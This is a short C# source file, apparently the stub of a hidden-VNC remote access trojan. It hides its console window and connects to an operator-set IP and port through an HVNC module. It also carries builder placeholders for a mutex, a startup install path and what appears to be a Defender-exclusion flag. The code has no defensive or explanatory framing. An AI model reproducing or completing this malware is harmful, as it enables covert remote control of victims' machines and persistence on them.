using System;
using System.Runtime.InteropServices;

namespace Stub
{
    class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;

        public static void Main(string[] args)
        {

            var handle = GetConsoleWindow();

            // Hide Console
            ShowWindow(handle, SW_HIDE);

            string IP_DNS = "#IPDNS#";
            string PORT = "#PORT#";
            string ID = "#ID#";
            string MUTEX = "#MUTEX#";

            string STARTUP = "#STARTUP#";
            string PATH = "#PATH#";
            string FOLDER = "#FOLDER#";
            string FILENAME = "#FILENAME#";

            string WDEX = "#WDEX#";

            HVNC.StartHVNC(IP_DNS + " " + PORT, ID, MUTEX);

            if (STARTUP == "True")
            {
                Installer.Run(PATH, FOLDER, FILENAME, WDEX);
            }

        }

    }

}

